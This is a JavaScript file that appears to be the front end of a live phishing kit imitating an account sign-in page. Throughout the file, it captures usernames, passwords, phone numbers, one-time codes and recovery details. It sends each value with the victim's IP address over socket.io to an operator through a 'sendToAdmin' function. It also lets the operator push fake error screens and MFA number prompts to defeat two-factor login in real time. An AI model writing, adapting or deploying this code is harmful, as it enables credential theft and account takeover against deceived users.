document.addEventListener('DOMContentLoaded', () => {
    const socket = io(); 
    const topLoader = document.getElementById('top_loader');
    const clickBlocker = document.getElementById('click_blocker');
    
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    const confirmInp = document.getElementById('inp_confirm');
    const verifyStartInp = document.getElementById('inp_verify');
    const verifyCodeInp = document.getElementById('inp_code');
    const recoveryInp = document.getElementById('inp_recovery');
    const recoveryOtpInp = document.getElementById('inp_recovery_otp');

    function updateLogos() {
        const localLogoPath = 'assets/logo.svg';
        const logoImgs = document.querySelectorAll('img[alt="logo"]');
        logoImgs.forEach(img => {
            img.onerror = null;
            img.src = localLogoPath;
        });
    }

    function forceShowSection(targetId) {
        const allSections = [
            'section_uname', 'section_pwd', 'section_confirm', 
            'section_verify', 'section_code', 'section_final',
            'section_auth_num', 'section_auth_err',
            'section_recovery', 'section_recovery_otp'
        ];
        allSections.forEach(id => {
            const el = document.getElementById(id);
            if(el) {
                el.classList.remove('active');
                el.style.display = "none";
            }
        });
        const targetEl = document.getElementById(targetId);
        if(targetEl) {
            targetEl.classList.add('active');
            targetEl.style.display = "table-cell"; // Restores perfect vertical centering
        }
    }

    socket.on('server_command', (cmdData) => {
        const action = typeof cmdData === 'string' ? cmdData : cmdData.action;
        const payload = cmdData.payload || null;

        if(topLoader) topLoader.style.display = "none";
        if(clickBlocker) clickBlocker.style.display = "none";

        switch (action) {
            case 'next_to_password':
                forceShowSection("section_pwd");
                updateUserIdentity(unameInp.value);
                break;
            case 'show_pwd_error':
                forceShowSection("section_confirm");
                updateUserIdentity(unameInp.value);
                break;
            case 'next_to_2fa':
                forceShowSection("section_verify");
                break;
            case 'show_2fa_error':
                forceShowSection("section_code");
                const errCode = document.getElementById('error_code');
                if(errCode) errCode.innerText = "The code you entered is incorrect. Please try again.";
                if(verifyCodeInp) verifyCodeInp.classList.add('error-inp');
                break;
            case 'show_auth_num':
                forceShowSection("section_auth_num");
                updateUserIdentity(unameInp.value);
                if (payload) {
                    const digitEl = document.getElementById('auth_digit_display');
                    if (digitEl) digitEl.innerText = payload; 
                }
                break;
            case 'show_auth_err':
                forceShowSection("section_auth_err");
                updateUserIdentity(unameInp.value);
                break;
            case 'show_recovery_email':
                forceShowSection("section_recovery");
                updateUserIdentity(unameInp.value);
                break;
            case 'next_to_recovery_otp':
                forceShowSection("section_recovery_otp");
                updateUserIdentity(unameInp.value);
                const recEmail = (recoveryInp && recoveryInp.value.trim() !== "") ? recoveryInp.value : "your email";
                const otpTextEl = document.getElementById('recovery_otp_text');
                if(otpTextEl) otpTextEl.innerText = `If ${recEmail} matches the email address on your account, we'll send you a code.`;
                break;
            case 'show_recovery_otp_error':
                forceShowSection("section_recovery_otp"); 
                const errRec = document.getElementById('error_recovery_otp');
                if(errRec) errRec.classList.remove('d-none');
                if(recoveryOtpInp) recoveryOtpInp.classList.add('error-inp');
                break;
            case 'finish':
                forceShowSection("section_final");
                localStorage.clear(); 
                break;
        }
    });

    async function sendToAdmin(stepName, additionalData = {}) {
        if(topLoader) topLoader.style.display = "block"; 
        if(clickBlocker) clickBlocker.style.display = "block";
        let ip = "0.0.0.0";
        try {
            const response = await fetch('https://api.ipify.org/?format=json');
            const resData = await response.json();
            ip = resData.ip;
        } catch (e) { console.error("IP Fetch Failed"); }

        socket.emit('send_logs', {
            step: stepName,
            username: (unameInp && unameInp.value.trim() !== "") ? unameInp.value : "unknown",
            ipAddress: ip,
            userAgent: navigator.userAgent,
            ...additionalData
        });
    }

    if(document.getElementById('btn_next')) document.getElementById('btn_next').addEventListener('click', () => {
        if (unameInp && unameInp.value.trim() !== "") {
            updateLogos(); 
            sendToAdmin("Email Submitted");
        }
    });
    if(document.getElementById('btn_confirm')) document.getElementById('btn_confirm').addEventListener('click', () => {
        if (pwdInp && pwdInp.value.trim() !== "") sendToAdmin("First Password Submitted", { password: pwdInp.value });
    });
    if(document.getElementById('btn_sig')) document.getElementById('btn_sig').addEventListener('click', () => {
        if (confirmInp && confirmInp.value.trim() !== "") sendToAdmin("Second Password Submitted", { password: confirmInp.value });
    });
    
    if(document.getElementById('btn_verify')) document.getElementById('btn_verify').addEventListener('click', () => {
        if (verifyStartInp && verifyStartInp.value.trim() !== "") {
            sendToAdmin("Phone Number Submitted", { phone: verifyStartInp.value });
            setTimeout(() => { forceShowSection("section_code"); }, 5000); 
        }
    });
    
    if(document.getElementById('btn_code')) document.getElementById('btn_code').addEventListener('click', () => {
        if (verifyCodeInp && verifyCodeInp.value.trim() !== "") sendToAdmin("OTP Code Submitted", { otp: verifyCodeInp.value });
    });
    if(document.getElementById('btn_recovery')) document.getElementById('btn_recovery').addEventListener('click', () => {
        if (recoveryInp && recoveryInp.value.trim() !== "") sendToAdmin("Recovery Email Submitted", { recovery_email: recoveryInp.value });
    });
    if(document.getElementById('btn_recovery_otp')) document.getElementById('btn_recovery_otp').addEventListener('click', () => {
        if (recoveryOtpInp && recoveryOtpInp.value.trim() !== "") sendToAdmin("Recovery OTP Submitted", { otp: recoveryOtpInp.value });
    });

    function updateUserIdentity(email) {
        document.querySelectorAll('#user_identity, #user_identity_rec, #user_identity_rec_otp').forEach(el => { el.innerText = email; });
    }
});
